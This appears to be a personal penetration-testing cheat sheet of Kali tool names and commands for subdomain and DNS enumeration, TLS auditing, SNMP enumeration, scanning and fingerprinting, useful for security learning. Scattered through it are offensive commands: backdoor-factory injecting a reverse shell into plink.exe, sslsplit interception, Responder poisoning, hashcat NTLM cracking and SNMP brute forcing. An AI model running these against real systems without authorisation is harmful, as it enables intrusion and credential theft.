##   [?] Dothost  - A DNS lookup network utility that outputs in Graphviz format
## --------------------------------------------------------------------------------- ##
## 
## ------------------------------------------------ ##
##   [?] dnsperf - DNS Performance Testing Tool
## ------------------------------------------------ ##
## 
## ------------------------------------------------------------ ##
##   [?] fever - event router for Suricatas EVE-JSON format
## ------------------------------------------------------------ ##
## 
## ----------------------------------------------------------------------------- ##
##   [?] lexicon - CLI for manipulating DNS records on various DNS providers
## ----------------------------------------------------------------------------- ##



sniffjoke
fiked
hamster-sidejack
isr-evilgrade
mitmproxy
rebind
responder
sslsniff
sslsplit
wifi-honey


## -------------------------------------------- ##
##   [?] O-Saft - SSL advanced forensic tool


## -------------------------------------------------------------- ##
##   [?] Ghidra - software reverse engineering (SRE) framework 
## -------------------------------------------------------------- ##
airgeddon
bully


fern-wifi-cracker
hackrf
pixiewps
reaver
redfang
rfcat
rtlsdr-scanner
inspectrum
king-phisher
mdk3
mfcuk
mfoc
mfterm
libfreefare-bin


mimikatz
passing-the-hash
wce
xspy
armitage
pompem
mdbtools
shellnoob
sidguesser
websploit
unicorn-magic
backdoor-factory



kerberoast



##-======================================================================-##
##   [+] Backdoor-Factory - Injecting a Backdoor Shell into Plink.exe  
##-======================================================================-##
backdoor-factory -f /usr/share/windows-binaries/plink.exe -H $IP -P 4444 -s reverse\_shell\_tcp




burpsuite


## -------------------------------------------------------------- ##
##   [?] Commix (short for [comm]and [i]njection e[x]ploiter).
## -------------------------------------------------------------- ##
##   [?] Commix - Automated All-in-One OS Command Injection and Exploitation Tool

routersploit



davtest

joomscan
jsql-injection
nikto
padbuster
skipfish
wig
wpscan
xsser
zaproxy
wafw00f
parsero


scalpel
xplico

eyewitness

hyperion
iodine
laudanum
nishang
pwnat
sbd
shellter
webacoo
weevely


impacket-scripts
ngrep
netsed
osslsigncode
ghidra
javasnoop
rizin
rizin-cutter
smali
firmware-mod-kit
clang






## ------------------------------------------------- ##
##   [+] Harvesting subdomains with assetfinder...
## ------------------------------------------------- ##
assetfinder $URL | grep '.$URL' | sort -u | tee -a $File.txt



assetfinder -subs-only $Domain >> $Dir/assetfinder.txt
echo "  - Found: $(cat assetfinder.txt | wc -l)"



findomain -u $Dir/findomain.txt -t $Domain


sublist3r -v -d $Domain -o $Dir/sublist3r.txt
sed -i 's/<BR>/\n/g' $Dir/sublist3r.txt
sort $Dir/sublist3r.txt | uniq > $Dir/sublist3r-fl.txt

subfinder -d $Domain -o $Dir/subfinder.txt -config $Dir/subfinder-config.yaml

amass enum  --passive -d $Domain -config $Dir/amass-config.ini -o $Dir/$File.txt

findomain -q -f /$Dir/$File -r -u findomain_domains.txt


amass enum -df /$Dir/$File -passive -o amass_passive_domains.txt
subfinder -dL /$Dir/$File -o subfinder_domains.txt


cat domains.txt | httprobe -c 50 -t 3000 >$File.txt

cat alive.txt | aquatone -silent --ports xlarge -out $Dir/ -scan-timeout 500 -screenshot-timeout 50000 -http-timeout 6000

dirsearch.py -E -t 50 --plain-text $Dir/$File -u $host -w /$Dir/$File.txt | grep Target


amass -active -brute -o $File.txt -d $Domain


cat $File.txt | aquatone

cat $File.xml | aquatone -nmap



## ---------------------------------------------------------- ##
##   [+] Harvesting full 3rd lvl domains with sublist3r...
## ---------------------------------------------------------- ##
for domain in $(cat $url/recon/3rd-lvl-domains.txt);do sublist3r -d $domain -o $url/recon/3rd-lvls/$domain.txt;done

## ------------------------------------- ##
##   [+] Probing for alive domains...
## ------------------------------------- ##
cat $url/recon/final.txt | sort -u | httprobe -s -p https:443 | sed 's/https\?:\/\///' | tr -d ':443' >> $url/recon/httprobe/alive.txt



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Sublist3r - OSINT Subdomain Enumeration Tool
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##




sublist3r -d $Domain

sublist3r -d $Domain --verbose --bruteforce

sublist3r -d $Target -vvv -o $Dir/domains-sublist3r-$Target.txt



subfinder -d $Domain

subfinder -d $Domain -t 100 -v


subfinder -o $Dir/domains-subfinder-$Target.txt -b -d $Target -w $Domains DEFAULT -t 100


## -------------------------------------- ##
##   [?] Running httpx with subfinder
## -------------------------------------- ##
subfinder -d $Domain | httpx -status-code

subfinder -d $Domain | httpx -title -tech-detect -status-code -title -follow-redirects




subjack -w $url/recon/httprobe/alive.txt -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3




#!/bin/bash
$DOMAIN=$1
for host in $(dig +short $DOMAIN ns);
 do
  dig +short $host >> resolvers.txt;
 done


subbrute.py /usr/share/wordlists/SecLists/Discovery/DNS/dns-Jhaddix.txt $DOMAIN | massdns -r ./resolvers.txt -w $DOMAIN.massdns.jhaddix.txt -t A -o S


brutedns.py -d $2 -s fast -l 5



altdns -l ~/urls.txt -o $File.txt

altdns -i ../dir$domain/domains.txt -o ../dir$domain/altdns_data_output.txt  -r -s ../dir$domain/altdns_domains.txt





# https://github.com/drduh/config/blob/master/scripts/dig.sh
query=""
for type in {A,AAAA,ALIAS,CNAME,MX,NS,PTR,SOA,SRV,TXT,DNSKEY,DS,NSEC,NSEC3,NSEC3PARAM,RRSIG,AFSDB,ATMA,CAA,CERT,DHCID,DNAME,HINFO,ISDN,LOC,MB,MG,MINFO,MR,NAPTR,NSAP,RP,RT,TLSA,X25} ; do
  dig +noall +short +noshort +answer $query $type ${1} 2>/dev/null
done





## -------------------------------------------------------------- ##
##   [?] Photon - Open Source Intelligence (OSINT) - Crawler
## -------------------------------------------------------------- ##
##   [?] https://github.com/s0md3v/Photon
## -------------------------------------------------------------- ##


photon -u $Domain -l 3 -t 100


## -------------------------------------------------------------------------------- ##
photon --url $URL                   ## root url
photon --cookie $File               ## cookie
photon --regex $Pattern             ## regex pattern
photon --threads $Num               ## number of threads
photon --delay $Num                 ## delay between requests
photon --verbose                    ## verbose output
photon --user-agent $UserAgent      ## custom user agent(s)
photon --export csv                 ## Export report as csv
photon --export json                ## Export report as json
photon --output $File               ## 
photon --level $Num                 ## 
photon --clone $URL                 ## clone the website locally
photon --headers                    ## add headers
photon --dns                        ## enumerate subdomains and DNS data
photon --keys                       ## find secret keys
photon --only-urls                  ## only extract URLs
photon --wayback                    ## fetch URLs from archive.org as seeds
## -------------------------------------------------------------------------------- ##



photon.py -u http://example.com

photon.py -u http://example.com -l 3

photon.py -u http://example.com -r "\d{10}"

photon.py -u http://example.com -c "PHPSSID=821b32d21"


photon.py -u http://example.com -t 10

photon.py -u http://example.com -d 1

photon.py -u http://example.com --ninja

photon.py -u http://example.com --dns

photon.py -u http://example.com -s "http://example.com/portals.html,http://example.com/blog/2018"









EyeWitness --web --single $Domain
EyeWitness --web -f $File -d $Dir/




## --------------------------------------------- ##
##  [?] Enumerates a domain for DNS entries
## --------------------------------------------- ##
dnsdict6 -4 -d -t 16 -e -x $Domain







##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] TLS/SSL - Enumeration + Recon + Auditing
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


sslscan $ip:443
sslscan --ipv4 --show-certificate --ssl2 --ssl3 --tlsall --no-colour $Domain



echo "Please provide the target ip address and the port."

sslscan --show-certificate --verbose --no-colour --xml=sslscan_$1_$2.xml $1:$2 2>&1 | tee "$1_$2_sslscan.txt"


sslh




sslyze $Domain --resume --certinfo=basic --compression --reneg --sslv2 --sslv3

sslyze -regular $Domain


tlssled $Domain 443

sslyze $domain --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers

sslyze $domain --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers > tmp



# SSLsplit is a tool for man-in-the-middle attacks against SSL/TLS encrypted network connections.
sslsplit -D -l connections.log -j /tmp/sslsplit/ -S /tmp/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080





httsquash -r $Domain

httprint -h $Domain -s $File.txt -P0


## ------------------------------------------------- ##
##   [+] Harvesting subdomains with assetfinder...
## ------------------------------------------------- ##
assetfinder $URL | grep '.$URL' | sort -u | tee -a $File.txt


assetfinder -subs-only $target > $File
assetfinder -subs-only $target > $subs_dir/assetfinder.txt


findomain -u $File -t $target
findomain -u $subs_dir/findomain.txt -t $target


sublist3r -v -d $target -o $File.txt
sed -i 's/<BR>/\n/g' $File.txt
sort $File | uniq > $File-sorted.txt


subfinder -d $target -o $subs_dir/subfinder.txt -config $config_dir/subfinder-config.yaml

amass enum  --passive -d $target -config $config_dir/amass-config.ini -o $subs_dir/amass.txt



hellfire

emailharvester

instaloader
inspy 
sherlock
irpas
sslh
swaks
hosthunter
finalrecon
dnschef
commix
cloudbrute
themole
websploit
weevely




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] SNMP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


##  [+] Enmerate users from SNMP
snmpwalk public -v1 192.168.X.XXX 1 | grep 77.1.2.25 | cut -d” “ -f4
python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP $TARGET

##  [+] Search SNMP with nmap
nmap -sT -p 161 192.168.1.0/24 -oG $File.txt


##  [+] Version3
nmap -sV -p 161 --script=snmp-info 192.168.1.0/24
nmap -sU  172.16.201.130 -p161 --script=snmp-brute  -Pn --script-args snmp-brute.communitiesdb=list.txt


##  [+] Wordlists
Metasploit Module snmp_enum
/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt


##  [+] SNMP ENumeration:

snmpget -v 1 -c public IP version
snmpcheck -t $TARGET
snmpenum -t $TARGET
snmpwalk -v 1 -c public IP
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2
snmpbulkwalk -v 2 -c public IP

snmpbrute.py -t <ip>

## gather snmp v1 information with standard community strings
snmpwalk -v1 -c public target-ip
snmpwalk -v1 -c private target-ip
snmpwalk -v1 -c manager target-ip

## enumerate windows users
snmpwalk -c public -v1 target-ip 1.3.6.1.4.1.77.1.2.25
    
## enumerate current windows processes
snmpwalk -c public -v1 target-ip 1.3.6.1.2.1.25.4.2.1.2
    
## enumerate windows open tcp ports
snmpwalk -c public -v1 target-ip 1.3.6.1.2.1.6.13.1.3
 
## enumerate installed software
snmpwalk -c public -v1 target-ip 1.3.6.1.2.1.25.6.3.1.2


use auxiliary/scanner/snmp/snmp_enum
use auxiliary/scanner/snmp/snmp_enumshares
use auxiliary/scanner/snmp/snmp_enumusers
use auxiliary/scanner/snmp/snmp_login

onesixtyone -c community -I $TARGET


onesixtyone -i $line -o ../dir${domain}/snmponesixtyone_output.txt
onesixtyone -c /usr/share/sparta/wordlists/snmp-default.txt -o snmp_one_sixtyone${2}.txt


onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt -dd $1 2>&1 | tee "snmp_onesixtyone_$1.txt"


patator snmp_login host=$line version=3 user=FILE0 0=$USERNAME -x ignore:mesg=unknownUserName


patator snmp_login host=$line version=3 user=FILE0 auth_key=FILE1 0=$USERNAME 1=$auth_key -x ignore:mesg=wrongDigest



## --------------------------------------- ##
##  [?] Miranda - discover UPNP devices
## --------------------------------------- ##
miranda -i eth0 -v




## --------------------------------------------------------------------- ##
##   [+] Double checking for subdomains with amass and certspotter...
## --------------------------------------------------------------------- ##
amass enum -d $URL | tee -a $URL/recon/$File.txt
curl -s https://certspotter.com/api/v0/certs\?domain\=$URL | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u
certspotter | tee -a $URL/recon/$File.txt




certspotter | tee -a $url/recon/final1.txt
sort -u $url/recon/final1.txt >> $url/recon/final.txt

subjack -w $url/recon/httprobe/alive.txt -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> $url/recon/potential_takeovers/potential_takeovers1.txt






nmap -sU -sV -p 53 --script dns-recursion $domain






dnscan.py --domain $Domain --wordlist $File


dnscan -d $Target -w $Domains QUICK -o $Dir/domains-dnscan-$Target.txt






fierce --domain $Domain --subdomains accounts --traverse 10
fierce --domain facebook.com --subdomains accounts admin ads
fierce --domain facebook.com --subdomains admin --traverse 10


##-============================================================================-##
##   [+] Limit nearby IP traversal to certain domains with the --search flag:
##-============================================================================-##
fierce --domain $Domain --subdomains admin --search $Domain $Domain
fierce --domain facebook.com --subdomains admin --search fb.com fb.net

##-==================================================================================-##
##   [+] Attempt an HTTP connection on domains discovered with the --connect flag:
##-==================================================================================-##
fierce --domain $Domain --subdomains mail --connect



##-=========================-##
##  [+] Fierce
##-=========================-##
fierce -dns $Domain
fierce -dns $Domain -file $OutputFile
fierce -dns $Domain -dnsserver $Server
fierce -range $IPRange -dnsserver $Server
fierce -dns $Domain -wordlist $Wordlist
fierce -dnsserver $DNS -dns $Domain -wordlist /usr/share/fierce/hosts.txt


fierce -dns $Domain -threads 3



# To scan a domain and output to a file
fierce -dns $Domain -file $File

# To scan a domain and specify which dnsserver to use
fierce -dns $Domain -dnsserver <server>

# To scan an internal ip range for a given server
fierce -range <ip-range> -dnsserver <server>

# To scan a domain using a given wordlist
fierce -dns $Domain -wordlist <wordlist>

# To scan a domain using a specified timeout and number of ip addresses to branch from all found addresses
fierce -dns $Domain -tcptimeout <# seconds> -traverse <# addresses>

# To scan domains from a list and search the entire class C for each found
fierce -dnsfile $File -wide















dnsenum.pl --enum -f $File.txt --update a -r $Domain >> ~/Enumeration/$domain



##-=====================================================================-##
##   [+] Search for the A record of $Domain on your local nameserver:
##-=====================================================================-##
dnstracer $Domain


##-=====================================================================-##
##   [+] Search for the MX record of $Domain on the root-nameservers:
##-=====================================================================-##
dnstracer "-s" . "-q" mx $Domain


##-=================================================================-##
##   [+] Search for the PTR record (hostname) of 212.204.230.141:
##-=================================================================-##
dnstracer "-q" ptr 141.230.204.212.in-addr.arpa


##-========================-##
##   [+] IPv6 addresses:
##-========================-##
dnstracer "-q" ptr "-s" . "-o" 2.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.6.4.0.2.0.0.0.0.8.b.0.e.f.f.3.ip6.int



##-=================================================================-##
##   [+]
##-=================================================================-##
dnstop -l 3 eth0



##-================-##
##  [+] DNSMap
##-================-##
dnsmap -w $File.txt $Domain


## ----------------------------------------------------------- ##
##   [+] DNSenum - enumerate various DNS records, such as:
##                 NS, MX, SOA, and PTR records.
##   [?] DNSenum also tries to perform DNS zone transfer
## ----------------------------------------------------------- ##

dnsenum -p 5 -s 20 $Domain
dnsenum -f $File.txt $Domain
dnsenum -o dnsenum_info $Domain

dnsenum --enum -f $File.txt --update a -r $URL




fragroute -f $Location $IP

fragrouter -i eth0 $options


nping -c 1 --tcp -p 80,433 $Domain

nping -tcp -p 445 -data hexdata(AF56A43D) $IP

nping --tcp -p 22 --flags syn --ttl 2 192.168.1.1




##-===============================-##
##   [+] NMap script categories  
##-===============================-##
nmap --scripts vuln,safe,discovery -oN scan.txt $IP


##-==============================-##
##   [+] list all nse scripts  
##-==============================-##
ls -lh /usr/share/nmap/scripts/


##-==================================-##
##   [+] nmap through socks4 proxy  
##-==================================-##
nmap --proxies socks4://proxy-ip:1080 $IP


##-=========================-##
##   [+] FTP Bounce Scan
##-=========================-##
nmap -P0 -n -b $User:$Pass@$IP $IP2 --proxies socks4://proxy-ip:1080 -vvvv



## -------------------------------------------------------------------------------------------- ##
##   [?] Checks target IP addresses against multiple DNS anti-spam and open proxy blacklists
## -------------------------------------------------------------------------------------------- ##
nmap --script dns-blacklist --script-args='dns-blacklist.ip=$IP'


##-===========================-##
##   [+] dns-zone-transfer:
##-===========================-##
## ---------------------------------------------------------------- ##
##   [?] Attempts to pull a zone file (AXFR) from a DNS server.
## ---------------------------------------------------------------- ##
nmap --script dns-zone-transfer.nse --script-args dns-zone-transfer.domain=$Domain -p53 $IP





nmap --script dns-brute --script-args dns-brute.domain=$Domain,dns-brute.threads=$Num,dns-brute.hostlist=$File,newtargets -sS -p 80
nmap --script dns-brute $Domain



nmap -sU -p 53 --script dns-cache-snoop.nse --script-args 'dns-cache-snoop.mode=timed,dns-cache-snoop.domains=$Domain' $IP




nmap -sn -Pn ns1.example.com --script dns-check-zone --script-args='dns-check-zone.domain=$Domain'



nmap -n -Pn -p53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=zonetransfer.me $Domain



nmap -n -sV -Pn -vv -sT -p $Port --script dns-cache-snoop,dns-check-zone,dns-ip6-arpa-scan,dns-nsec-enum,dns-nsec3-enum,dns-nsid,dns-random-srcport,dns-random-txid,dns-recursion,dns-service-discovery,dns-srv-enum,dns-update,dns-zone-transfer,whois-domain --script-args dns-check-zone.domain=%s,dns-nsec-enum.domains=%s,dns-nsec3-enum-domains=%s,dns-srv-enum.domain=%s,dns-zone-transfer.domain=

nmap -n -sV -Pn -vv -sU -p $Port --script dns-cache-snoop,dns-check-zone,dns-ip6-arpa-scan,dns-nsec-enum,dns-nsec3-enum,dns-nsid,dns-random-srcport,dns-random-txid,dns-recursion,dns-service-discovery,dns-srv-enum,dns-update,dns-zone-transfer,whois-domain --script-args dns-check-zone.domain=%s,dns-nsec-enum.domains=%s,dns-nsec3-enum-domains=%s,dns-srv-enum.domain=%s,dns-zone-transfer.domain=


##-===========================-##
##   [+] NMap - DNS Fuzzer  
##-===========================-##
nmap --script dns-fuzz --script-args timelimit=2h $IP -d



curl https://api.hackertarget.com/aslookup/?q=$1 > IP_LIST.txt


##-===================================================================================-##
##   [+] NMap - Finding netblocks that belong to an ASN using targets-asn NSE script
##-===================================================================================-##
nmap --script targets-asn --script-args targets-asn.asn=$ASN


##-=================================================-##
##   [+] NMap - Find Information about IP address
##-=================================================-##
nmap --script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24


##-================================================-##
##   [+] Curl - Find ASN for a given IP address:
##-================================================-##
curl -s http://ip-api.com/json/$IP | jq -r .as


##-============================================================================-##
##   [+] ss - Lookup Autonomous Systems (AS) of all outgoing http/s traffic
##-============================================================================-##
ss -t -o state established '( dport = :443 || dport = :80 )'|grep tcp|awk '{ print $5 }'|sed s/:http[s]*//g|sort -u|netcat whois.cymru.com 43|grep -v "AS Name"|sort -t'|' -k3



##-===================================-##
##   [+] IPCalc - Calculate subnet
##-===================================-##
ipcalc xxx.xxx.xxx.xxx/24



##-=========================================-##
##   [+] NMap - live hosts - Netmask Scan
##-=========================================-##
nmap -vv -n -sn -PM -oA $File $1 | grep -w 'report' | grep -v 'host down' | sed 's/Nmap scan report for //' | sort -u -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4 | tee $LOGNAME2




## ---------------------------------------------------------------------- ##
	fping -a -q -g $2				## Generate Alive Hosts From File
## ---------------------------------------------------------------------- ##
	fping -g $IP $IP				## Generate Host List:
## ---------------------------------------------------------------------- ##
	fping -s $Domain				## Display Statistics:
## ---------------------------------------------------------------------- ##
	fping < $File					## ping addresses read from a file
## ---------------------------------------------------------------------- ##
	fping -ag 192.0.2.0/24			## Find hosts In a given subnet
## ---------------------------------------------------------------------- ##
	fping $IP -s -c 10000 -p 100	## send high rate of
									## echo-request packets
## ---------------------------------------------------------------------- ##



## --------------------------------------------------------- ##
##   [?] Use fping to test reachability to range of hosts
##       using bash for loop to define hosts
## --------------------------------------------------------- ##
for i in {1..5} ; do fping -C 3 -d -q -s -g 10.0.2$i.100 10.0.2$i.150 ; done



fping -A -f /tmp/ip 2>&-


##-====================================================-##
##   [+] Print List of Live Hosts on Local Network:
##-====================================================-##
genlist -s 192.168.1.\*




## ------------------------------------------------- ##
##   [?] p0f - passive os fingerprinting utility
## ------------------------------------------------- ##
p0f -i eth0
p0f -i wlan0


##-=========================================================-##
##   [+] Set iface to promiscuous mode, dump to log file:
##-=========================================================-##
p0f -i eth0 -p -d -o $File.log
p0f -i wlan0 -p -d -o $File.log


##-============================================-##
##   [+] p0f - Read from offline PCAP $File:
##-============================================-##
p0f -r $File 


##-======================================================-##
##   [+] p0f - Filter Traffic - Source Port - FTP-Data
##-======================================================-##
p0f -r $File 'src port ftp-data'
p0f -i wlan0 'src port ftp-data'


##-====================================================================================-##
##   [+] p0f - Filter Traffic - NOT Destination Network 10.0.0.0 & Netmask 255.0.0.0
##-====================================================================================-##
p0f -r $File 'not dst net 10.0.0.0 mask 255.0.0.0'
p0f -i wlan0 'not dst net 10.0.0.0 mask 255.0.0.0'


##-=============================================================-##
##   [+] p0f - Filter Traffic - Destination Port 80 & $SrcIP
##-=============================================================-##
p0f -r $File 'dst port 80 and ( src host $SrcIP or src host $SrcIP )'
p0f -i wlan0 'dst port 80 and ( src host $SrcIP or src host $SrcIP )'



## ----------------------------------------------------------- ##
##   [?] WAFW00F - Web Application Firewall Detection Tool
## ----------------------------------------------------------- ##
wafw00f $Domain


wafw00f $Domain -a -v





## --------------------------------------------------------------------- ##
##    [?] Firewalk - active reconnaissance network security tool 
## --------------------------------------------------------------------- ##
##    [?] Detect ports the firewall is forwarding to a target
## --------------------------------------------------------------------- ##
firewalk -S1-1024 -i eth0 -n -pTCP 10.0.0.1 10.0.2.50


firewalk -S8079-8081 -i eth0 -n -pTCP 192.168.1.1 192.168.0.1




## -------------------------------------------------- ##
##    [?] Responder - LLMNR/NBT-NS/mDNS Poisoner
## -------------------------------------------------- ##


responder -I eth -w -F



/usr/share/responder/logs/






##-=======================================-##
##   [+] Hashcat - Crack NTLM Passwords
##-=======================================-##
hashcat -m 5600 /$Dir/hashes.txt /$Dir/passwords.txt -o /$Dir/cracked.txt --force




## --------------------------------------------------------- ##
##   [?] Bloodhound - Map An Active Directory Environment
## --------------------------------------------------------- ##
bloodhound-python -c All -d hackme.local -u $User -p $Pass -ns $IP



##-===============================================================-##
##   [+] bloodhound - LDAP Active Directory - Lateral Movement
##-===============================================================-##
## --------------------------------------------------------------- ##
##   [?] invoke-bloodhound from sharphound.ps1 
## --------------------------------------------------------------- ##
import-module .\sharphound.ps1
invoke-bloodHound -CollectionMethod All -domain target-domain -LDAPUser username -LDAPPass password







arachni http://$TARGET --report-save-path=$ARACHNI_REPORT_DIR/$TARGET --output-only-positives --scope-include-subdomains





## ------------------------------------------------- ##
##   [+] Xprobe2 OS fingerprinting
## ------------------------------------------------- ##
##   [?] fuzzy signature matching to provide
##       the probable operating system assessment
## ------------------------------------------------- ##
xprobe2 $IP

xprobe2 -v -p tcp:80:open $IP
xprobe2 -v -p tcp:80:open 192.168.6.66




## ---------------------------------------------------------------------- ##
##   [?] If TCP port 139 is open, enable application level SMB module
## ---------------------------------------------------------------------- ##
xprobe2 -p tcp:139:open 192.168.1.2


##-========================================-##
##   [+] Xprobe2 - Portscanning Module
##-========================================-##
xprobe2 -T 1-1024 127.0.0.1


## ----------------------------------------------------------------- ##
##   [?] TCP handshake module - Trys to blindly guess open ports
## ----------------------------------------------------------------- ##
xprobe2 -B 192.168.1.1



##-=========================================-##
##   [+] TCP handshake Module (Number 11) 
##-=========================================-##
## -------------------------------------------------------- ##
##   [?] very usefull when all ICMP traffic is filtered
## -------------------------------------------------------- ##
xprobe2 -M 11 -p tcp:80:open 192.168.1.1


## ------------------------------------------ ##
##   [?] Launch an OS Fingerprint Attempt
## ------------------------------------------ ##
xprobe2 -v -p udp:53:closed 192.168.1.20


## ---------------------------------------------------- ##
##   [?] Launch OS Fingerprinting Modules 1 & 2
##   [?] Module 1 & 2 Are Reachability Tests:
## ---------------------------------------------------- ##
xprobe2 -v -D 1 -D 2 192.168.1.10





## ---------------------------------------------------------------------- ##
##   [?] DMitry - Deepmagic Information Gathering Tool
## ---------------------------------------------------------------------- ##
dmitry -n $Domain       ## Retrieve  netcraft.com  data
dmitry -i $IP           ## Internet Number whois lookup
dmitry -w $Domain       ## Perform a whois lookup on the host target.
dmitry -p $Domain       ## Perform a TCP portscan on the host target
dmitry -s $Domain       ## Perform a subdomain search
dmitry -o $File $Domain ## Create  an ascii text output of the results



##-======================================-##
##   [+] Lbd - Load Balancing Detector
##-======================================-##
## ---------------------------------------------------------------------------- ##
##   [?] Detects whether a given domain uses DNS and/or HTTP load-balancing
## ---------------------------------------------------------------------------- ##
lbd.sh $URL



## ---------------------------------------------------------------------- ##
##   [?] Halberd - HTTP-based load balancer detector.
##   [?]           checks for differences in the
##   [?]           HTTP response headers, cookies, timestamps, etc.
## ---------------------------------------------------------------------- ##
halberd $Domain




SYN                     :    -mT
ACK scan                :    -mTsA
Fin scan                :    -mTsF
Null scan               :    -mTs
Xmas scan               :    -mTsFPU
Connect Scan            :    -msf -Iv
scan with all options   :    -mTFSRPAUEC
Syn + osdetect          :    -eosdetect -Iv (-mT)
scan ports 1 through 5  :   (-mT) host:1-5



unicornscan -mU -I 192.168.24.53:a -v -l unicorn\_full\_udp.txt
unicornscan -mT -I 192.168.24.53:a -v -l unicorn\_full\_tcp.txt





unicornscan 192.168.0.0/24:139				## network wide scan on port 139:

unicornscan -r500 -mT 198.71.232.1/24:80,443,445,339

unicornscan -r200 -Iv -eosdetect  -mT 198.71.232.3:3306,80,443

unicornscan -r200 -Iv -eosdetect -mT vyxunbnbs.com:3306,80,443

unicornscan -eosdetect -Iv -v vyxunbnbs.com

unicornscan -msf -v -I 198.71.232.3/24 



us -H -msf -Iv 192.168.56.101 -p 1-65535        ## Verbose TCP Scan Mode -H resolve hostnames
us -H -mU -Iv 192.168.56.101 -p 1-65535         ## Verbose UDP Scan Mode -H resolve hostnames


##-=============================================-##
##   [+] UnicornScan - scan with all options
##-=============================================-##
unicornscan -mTFSRPAUEC


##-================================-##
##   [+] UnicornScan - Xmas scan
##-================================-##
unicornscan -mTsFPU


##-================================-##
##   [+] UnicornScan - ACK scan
##-================================-##
unicornscan -mTsA


##-================================-##
##   [+] UnicornScan - Fin scan
##-================================-##
unicornscan -mTsF


##-=================================-##
##   [+] UnicornScan - Null scan
##-=================================-##
unicornscan -mTs+-

0.








NetworkMiner






ass - autonomous system scanner




sudo chown -R <username> /opt/metasploit-framework/
sudo chown -R <username> /Users/<username>/.msf4/
/opt/metasploit-framework/msfdb init
/opt/metasploit-framework/bin/msfconsole










##-===================================-##
##   [+] UnicornScan - Connect Scan
##-===================================-##
unicornscan -msf -Iv $IP



ACK scan                :    -mTsA
Fin scan                :    -mTsF
Null scan               :    -mTs
Xmas scan               :    -mTsFPU
Connect Scan            :    -msf -Iv


http://127.0.0.1/unicornscan




##-================================================-##
##   [+] UnicornScan - UDP Scan - Top 100 Ports:
##-================================================-##

unicornscan -H -I -v -mU -p 7,9,17,19,49,53,67,68,69,80,88,111,120,123,135,136,137,138,139,158,161,162,177,427,443,445,497,500,514,515,518,520,593,623,626,631,996,997,998,999,1022,1023,1025,1026,1027,1028,1029,1030,1433,1434,1645,1646,1701,1718,1719,1812,1813,1900,2000,2048,2049,2222,2223,3283,3456,3703,4444,4500,5000,5060,5353,5632,9200,10000,17185,20031,30718,31337,32768,32769,32771,32815,33281,49152,49153,49154,49156,49181,49182,49185,49186,49188,49190,49191,49192,49193,49194,49200,49201,65024 $1 2>&1 | tee "udp_ports_top100_$1_unicornscan.txt"




Uniscan - LFI, RFI, and RCE vulnerability scanner






finalrecon -d $DNS        ## Custom DNS Servers [ Default : 1.1.1.1 ]

finalrecon -e txt         ## TXT File Extension
finalrecon -e xml         ## XML File Extension

finalrecon -o txt         ## Export Output Format: .txt
finalrecon -o xml         ## Export Output Format: .xml
finalrecon -o csv         ## Export Output Format: .csv

finalrecon -w $File       ## Path to Wordlist [ Default : wordlists/dirb_common.txt


finalrecon --headers $Domain        ## Header Information
finalrecon --sslinfo $Domain        ## SSL Certificate Information
finalrecon --whois $Domain          ## Whois Lookup
finalrecon --crawl $Domain          ## Crawl Target
finalrecon --dns $Domain            ## DNS Enumeration
finalrecon --sub $Domain            ## Sub-Domain Enumeration
finalrecon --trace $Domain          ## Traceroute
finalrecon --dir $Domain            ## Directory Search
finalrecon --ps $Domain             ## Fast Port Scan
finalrecon --full $Domain           ## Full Recon








pnscan


##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	        [+] OpenVAS - Vulnerability Scanner
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##

openvas-scanner



##-===============================-##
##   [+] Fetch OpenVAS GPG Key:
##-===============================-##
curl --progress -k -L "http://www.openvas.org/OpenVAS_TI.asc" | gpg --import -


##-==================================-##
##   [+] Sync the OpenVAS NVT feed:
##-==================================-##
sudo openvas-nvt-sync


## --------------------------------------------------------- ##
##   [?] Sync Security Content Automation Protocol (SCAP):
## --------------------------------------------------------- ##
sudo openvas-scapdata-sync

## ------------------------------------------------------ ##
##   [?] Sync Computer Emergency Readiness Team (CERT):
## ------------------------------------------------------ ##
sudo openvas-certdata-sync


##-=================================================-##
##   [+] Restart the OpenVAS scanner and manager:
##-=================================================-##
sudo service openvas-scanner restart
sudo service openvas-manager restart


##-=====================================-##
##   [+] Rebuild the OpenVAS database:
##-=====================================-##
sudo openvasmd --rebuild --progress


##-============================================-##
